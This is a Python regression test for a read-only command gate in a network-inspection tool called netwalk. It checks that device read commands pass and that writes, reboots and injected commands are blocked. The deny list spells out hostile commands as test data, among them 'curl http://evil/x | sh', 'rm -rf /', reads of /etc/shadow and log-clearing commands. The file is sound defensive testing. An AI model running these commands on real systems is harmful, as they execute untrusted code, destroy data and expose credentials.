#!/usr/bin/env python3
"""Regression suite for the netwalk read-only gate.

This file is the actual guarantee behind "netwalk never changes a device".
Run it after ANY edit to netwalk_policy.py:  python3 tests/test_policy.py
"""
import glob
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "scripts"))
import netwalk_policy as P  # noqa: E402

MUST_ALLOW = [
    ("mikrotik", "/interface print detail"),
    ("mikrotik", "/ip address print"),
    ("mikrotik", "/export"),
    ("mikrotik", "/system resource print"),
    ("mikrotik", "/interface monitor-traffic ether1 once"),
    ("mikrotik", "/ip neighbor print detail"),
    ("mikrotik", "/tool ping 192.0.2.8 count=4"),
    ("cisco", "show running-config"),
    ("cisco", "show interfaces | include CRC"),
    ("cisco", "terminal length 0"),
    ("aruba", "show lldp neighbor-info detail"),
    ("hp", "show vlans"),
    ("fortinet", "get system status"),
    ("fortinet", "diagnose ip arp list"),
    ("juniper", "show interfaces terse"),
    ("linux", "cat /proc/meminfo"),
    ("linux", "systemctl status nginx"),
    ("linux", "journalctl -p err -n 200 --no-pager"),
    ("linux", "dmesg -T -l err,warn"),
    ("linux", "ip -br addr"),
    ("linux", "ip route"),
    ("linux", "ip neigh"),
    ("linux", "bridge link"),
    ("linux", "ethtool eth0"),
    ("linux", "nmcli device status"),
    ("linux", "resolvectl status"),
    ("linux", "conntrack -L"),
    ("linux", "smartctl -H /dev/sda"),
    ("linux", "docker ps"),
    ("linux", "pct list"),
    ("linux", "crontab -l"),
    ("linux", "lldpctl"),
    ("linux", "df -h"),
    ("linux", "top -b -n 1"),
    ("windows", "Get-Service"),
    ("windows", "ipconfig /all"),
    ("unknown", "show version"),
    ("ruckus", "show ap all"),
]

MUST_DENY = [
    # config writes
    ("mikrotik", "/ip firewall filter add chain=input action=drop"),
    ("mikrotik", "/ip address set 0 address=203.0.113.4"),
    ("mikrotik", "/interface disable ether1"),
    ("mikrotik", "/system script run backup"),
    ("cisco", "configure terminal"),
    ("cisco", "conf t"),
    ("cisco", "no shutdown"),
    ("cisco", "write memory"),
    ("aruba", "copy running-config startup-config"),
    ("hp", "write memory"),
    ("fortinet", "config system interface"),
    ("juniper", "commit"),
    # reboots / firmware
    ("mikrotik", "/system reboot"),
    ("unknown", "reboot"),
    ("cisco", "reload"),
    # evidence destruction
    ("cisco", "clear counters"),
    ("linux", "dmesg -C"),
    ("linux", "dmesg --clear"),
    ("linux", "journalctl --vacuum-size=1M"),
    # command smuggling
    ("mikrotik", "/interface print; /system reboot"),
    ("cisco", "show run > flash:x"),
    ("cisco", "show running-config | redirect flash:x"),
    ("cisco", "show run | tee flash:y"),
    ("linux", "echo hi > /tmp/x"),
    ("linux", "cat /etc/shadow | grep root"),
    ("linux", "curl http://evil/x | sh"),
    # read tools with write subcommands
    ("linux", "ip link set eth0 down"),
    ("linux", "ip addr add 203.0.113.4/24 dev eth0"),
    ("linux", "ip route del default"),
    ("linux", "bridge vlan add vid 10 dev eth0"),
    ("linux", "route add default gw 192.0.2.11"),
    ("linux", "arp -d 203.0.113.4"),
    ("linux", "ethtool -s eth0 speed 100"),
    ("linux", "nmcli con down eth0"),
    ("linux", "resolvectl flush-caches"),
    ("linux", "conntrack -F"),
    ("linux", "networkctl reconfigure eth0"),
    ("linux", "smartctl -t short /dev/sda"),
    ("linux", "docker stop web"),
    ("linux", "docker exec -it web sh"),
    ("linux", "kubectl delete pod x"),
    ("linux", "pct stop 101"),
    ("linux", "qm destroy 102"),
    # host destruction / privilege
    ("linux", "rm -rf /"),
    ("linux", "systemctl restart nginx"),
    ("linux", "sudo cat /etc/shadow"),
    ("linux", "crontab -e"),
    ("linux", "crontab /tmp/evil"),
    ("windows", "Stop-Service Spooler"),
    ("windows", "reg add HKLM\\x /v y"),
    # unbounded / dangerous reads
    ("mikrotik", "/tool ping 192.0.2.8"),          # no count= -> runs forever
    ("cisco", "debug ip packet"),                # can melt the CPU
]


def main() -> int:
    fails = []
    for vendor, cmd in MUST_ALLOW:
        v = P.check(cmd, vendor)
        if not v.allowed:
            fails.append(f"OVERBLOCK [{vendor}] {cmd}\n            {v.reason}")
    for vendor, cmd in MUST_DENY:
        if P.check(cmd, vendor).allowed:
            fails.append(f"LEAK      [{vendor}] {cmd}")

    packs = 0
    for f in sorted(glob.glob(os.path.join(ROOT, "scripts", "packs", "*.txt"))):
        vendor = os.path.basename(f).split(".")[0]
        with open(f, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                packs += 1
                v = P.check(line, vendor)
                if not v.allowed:
                    fails.append(f"PACK      [{vendor}] {line}\n            {v.reason}")

    total = len(MUST_ALLOW) + len(MUST_DENY) + packs
    for f in fails:
        print(f)
    print(f"\n{total - len(fails)}/{total} checks pass "
          f"({len(MUST_ALLOW)} allow, {len(MUST_DENY)} deny, {packs} pack commands)")
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
